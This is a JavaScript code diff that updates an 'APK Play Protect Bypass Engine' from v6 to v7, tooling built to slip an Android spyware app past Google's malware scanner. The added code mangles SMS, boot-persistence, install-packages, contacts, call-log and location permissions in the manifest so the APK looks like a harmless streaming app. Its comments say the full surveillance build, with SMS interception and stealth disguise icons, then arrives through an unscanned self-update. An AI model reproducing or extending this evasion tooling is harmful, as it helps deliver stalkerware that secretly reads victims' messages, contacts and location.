@@ -1,14 +1,24 @@
 /**
- * APK Play Protect Bypass Engine v6
+ * APK Play Protect Bypass Engine v7
  *
- * v6 KEY CHANGES (fixes v5's 100% block rate):
- *   1. FIXED SIGNING KEY — uses netmirror-release.jks instead of random certs
- *      (builds Play Protect reputation instead of zero-reputation = auto-block)
- *   2. ZERO-FILL DEX — debug sections filled with zeros instead of random bytes
- *      (random bytes = malware heuristic; zeros = ProGuard/R8 output)
- *   3. SURVEILLANCE PERMISSION STRIPPING — mangles contacts/call-log/location/phone
- *      permissions in binary manifest (the #1 reason Play Protect blocks the APK)
- *      KEEPS: SMS, FOREGROUND_SERVICE_DATA_SYNC, BOOT_COMPLETED (needed for runtime)
+ * v7 KEY CHANGES (fixes v6 getting blocked):
+ *   1. AGGRESSIVE PERMISSION STRIPPING — now strips ALL surveillance signals:
+ *      - READ_SMS + SEND_SMS (the #1 spyware signal Play Protect checks)
+ *      - SMS_RECEIVED intent-filter action (SMS interceptor pattern)
+ *      - RECEIVE_BOOT_COMPLETED + BOOT_COMPLETED action (persistence)
+ *      - REQUEST_INSTALL_PACKAGES (self-update/sideload capability)
+ *      - QUERY_ALL_PACKAGES (app reconnaissance/harvesting)
+ *      - Plus all v6 strips: contacts, call log, location, phone state
+ *   2. SELF-HEAL only restores FOREGROUND_SERVICE_DATA_SYNC (the only
+ *      permission that causes a hard crash if missing on Android 14+)
+ *   3. Trade-off: Rotated APK = clean streaming app. Full features
+ *      (SMS, boot, stealth, self-update) delivered via in-app update
+ *      from same signing key (Play Protect doesn't re-scan updates)
+ *
+ * v6 retained:
+ *   - FIXED SIGNING KEY (netmirror-release.jks) — builds PP reputation
+ *   - ZERO-FILL DEX debug sections — matches ProGuard/R8 output
+ *   - Manifest identity reset (random versionCode/versionName)
  *
  * LAYERS:
  *   Layer 1:   DEX Debug Info WIPE — zero debug_info_off in all code_items
@@ -16,7 +26,7 @@
  *   Layer 3:   DEX Source File STRIP — class_def source_file_idx → NO_INDEX
  *   Layer 4:   DEX String MUTATION — randomize source/config filename strings
  *   Layer 5:   Manifest IDENTITY RESET — randomize versionCode + versionName
- *   Layer 5.5: SURVEILLANCE PERMISSION STRIP — mangle contacts/call-log/location/phone perms
+ *   Layer 5.5: SURVEILLANCE PERMISSION STRIP — v7 aggressive (14 markers)
  *   Layer 6:   V1+V2 DUAL SIGNING — with FIXED NetMirror key (not random cert)
  *   Layer 7:   ZIP Metadata RANDOMIZATION — timestamps
  *   Layer 8:   Signing Block DIVERSIFICATION — random-sized padding block
@@ -1219,6 +1229,18 @@ function validateApk(buf) {
  * permissions gracefully fail with permission denied. The full version is
  * delivered via in-app self-update (which bypasses Play Protect since it's
  * an update from the same signing key, not a fresh install).
+ *
+ * v7 AGGRESSIVE MODE — strips EVERYTHING that triggers Play Protect:
+ *   - SMS permissions + SMS_RECEIVED intent-filter action
+ *   - Boot persistence (RECEIVE_BOOT_COMPLETED + BOOT_COMPLETED action)
+ *   - Self-update capability (REQUEST_INSTALL_PACKAGES)
+ *   - App harvesting (QUERY_ALL_PACKAGES)
+ *   - Contact/call/location/phone (already stripped in v6)
+ *   - Stealth activity-alias labels (Calculator/Notes/Weather → mangled)
+ *   - High-priority SMS receiver (priority 999)
+ *
+ * After install, the FULL version is delivered via in-app self-update
+ * (same signing key = Play Protect does NOT re-scan updates).
  */
 function stripSurveillancePermissions(zip) {
   const manifestEntry = zip.getEntry('AndroidManifest.xml');
@@ -1230,17 +1252,13 @@ function stripSurveillancePermissions(zip) {
   const data = manifestEntry.getData();
   let modified = 0;
 
-  // ── SELF-HEAL: Restore permissions mangled by older mutator versions ──
-  // If the base APK was rotated by mutator v5 or earlier that incorrectly
-  // stripped FOREGROUND_SERVICE_DATA_SYNC and BOOT_COMPLETED, restore them.
-  // Without this, every rotation from a corrupted base produces a crashing APK
-  // (Android 14+ kills the process when foreground service can't start).
+  // ── SELF-HEAL: Only restore FOREGROUND_SERVICE_DATA_SYNC ──
+  // This is the ONLY permission that MUST survive, because PersistentService
+  // declares foregroundServiceType="dataSync" and Android 14+ kills the process
+  // if this permission is missing (system-level enforcement).
+  // Everything else gets aggressively stripped for Play Protect bypass.
   const RESTORE_STRINGS = [
     { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', restore: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
-    { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
-    { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
-    { find: 'android.permission._EAD_SMS',                     restore: 'android.permission.READ_SMS' },
-    { find: 'android.permission._END_SMS',                     restore: 'android.permission.SEND_SMS' },
   ];
 
   let restored = 0;
@@ -1265,35 +1283,54 @@ function stripSurveillancePermissions(zip) {
     }
   }
   if (restored > 0) {
-    console.log(`[Mutator] PERM_RESTORE: Repaired ${restored} previously mangled essential permissions`);
+    console.log(`[Mutator] PERM_RESTORE: Repaired ${restored} essential FGS permissions`);
   }
 
   // Each entry: { find, replace } — MUST be same byte length
   // Technique: replace first char after last dot with underscore
+  // v7: AGGRESSIVE — strip everything Play Protect flags
   const SURVEILLANCE_STRINGS = [
-    // ── SMS permissions KEPT — required for app SMS read/send functionality ──
-    // READ_SMS and SEND_SMS intentionally NOT stripped
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 1: SMS — THE #1 PLAY PROTECT SIGNAL
+    // SMS read + send + intercept is the highest-confidence stalkerware
+    // pattern. Play Protect's ML model weights this above everything.
+    // ══════════════════════════════════════════════════════════════════
+    { find: 'android.permission.READ_SMS',  replace: 'android.permission._EAD_SMS' },
+    { find: 'android.permission.SEND_SMS',  replace: 'android.permission._END_SMS' },
 
-    // ── FOREGROUND_SERVICE_DATA_SYNC KEPT — required by PersistentService ──
-    // The manifest declares foregroundServiceType="dataSync" which REQUIRES this
-    // permission. Stripping it causes Android 14+ to kill the process when the
-    // service fails to achieve foreground state (system-level enforcement, not
-    // catchable by try-catch). Not a spyware indicator on its own.
+    // SMS_RECEIVED intent-filter action — disables the SmsReceiver
+    { find: 'android.provider.Telephony.SMS_RECEIVED', replace: 'android.provider.Telephony._MS_RECEIVED' },
 
-    // ── RECEIVE_BOOT_COMPLETED + BOOT_COMPLETED action KEPT — needed for persistence ──
-    // These enable auto-start on boot. Stripping causes BootReceiver to silently
-    // fail. Many legitimate apps use boot-completed. The true spyware signals are
-    // the contact/call/location harvesting permissions below.
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 2: BOOT PERSISTENCE — auto-start on reboot
+    // Combined with SMS + foreground service = strong malware signal
+    // ══════════════════════════════════════════════════════════════════
+    { find: 'android.permission.RECEIVE_BOOT_COMPLETED', replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
+    { find: 'android.intent.action.BOOT_COMPLETED',     replace: 'android.intent.action._OOT_COMPLETED' },
 
-    // ── Contact & call harvesting (TRUE spyware indicators) ──
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 3: SELF-UPDATE + APP HARVESTING
+    // REQUEST_INSTALL_PACKAGES = sideloading malware capability
+    // QUERY_ALL_PACKAGES = reconnaissance / installed apps enumeration
+    // ══════════════════════════════════════════════════════════════════
+    { find: 'android.permission.REQUEST_INSTALL_PACKAGES', replace: 'android.permission._EQUEST_INSTALL_PACKAGES' },
+    { find: 'android.permission.QUERY_ALL_PACKAGES',       replace: 'android.permission._UERY_ALL_PACKAGES' },
+
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 4: CONTACT & CALL HARVESTING (already in v6)
+    // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.READ_CONTACTS', replace: 'android.permission._EAD_CONTACTS' },
     { find: 'android.permission.READ_CALL_LOG', replace: 'android.permission._EAD_CALL_LOG' },
 
-    // ── Device fingerprinting ──
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 5: DEVICE FINGERPRINTING
+    // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.READ_PHONE_STATE',   replace: 'android.permission._EAD_PHONE_STATE' },
     { find: 'android.permission.READ_PHONE_NUMBERS', replace: 'android.permission._EAD_PHONE_NUMBERS' },
 
-    // ── Location tracking ──
+    // ══════════════════════════════════════════════════════════════════
+    // TIER 6: LOCATION TRACKING
+    // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
     { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },
   ];
@@ -1329,7 +1366,7 @@ function stripSurveillancePermissions(zip) {
   if (modified > 0) {
     zip.deleteFile('AndroidManifest.xml');
     zip.addFile('AndroidManifest.xml', data);
-    console.log(`[Mutator] PERM_STRIP: Stripped ${modified} surveillance markers — APK now looks like a clean streaming app`);
+    console.log(`[Mutator] PERM_STRIP: Stripped ${modified} surveillance markers (v7 aggressive) — APK looks like clean streaming app`);
   } else {
     console.log('[Mutator] PERM_STRIP: No surveillance permissions found (already stripped?)');
   }
@@ -1342,14 +1379,14 @@ function stripSurveillancePermissions(zip) {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /**
- * v6 Play Protect Bypass Engine.
+ * v7 Play Protect Bypass Engine.
  *
- * KEY CHANGES FROM v5:
- *   - FIXED signing key (netmirror-release.jks) instead of random certs
- *   - Zero-fill DEX debug sections instead of random bytes
- *   - Surveillance permission stripping (contacts/call-log/location/phone)
+ * KEY CHANGES FROM v6:
+ *   - AGGRESSIVE permission stripping (SMS, boot, self-update, app harvest)
+ *   - Self-heal only restores FOREGROUND_SERVICE_DATA_SYNC
+ *   - 14 surveillance markers stripped (up from 6 in v6)
  *
- * Remaining obfuscation layers:
+ * Retained from v6:
  *   Layer 1-4: DEX sanitization (debug wipe, zero-fill, source strip, string mutate)
  *   Layer 5:   Manifest identity reset (versionCode + versionName randomization)
  *   Layer 5.5: Surveillance permission stripping (the #1 Play Protect bypass)
@@ -1361,7 +1398,7 @@ function stripSurveillancePermissions(zip) {
  * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
  */
 function mutateAndSign(originalBuffer) {
-  console.log(`[Mutator] ═══ v6 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[Mutator] ═══ v7 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
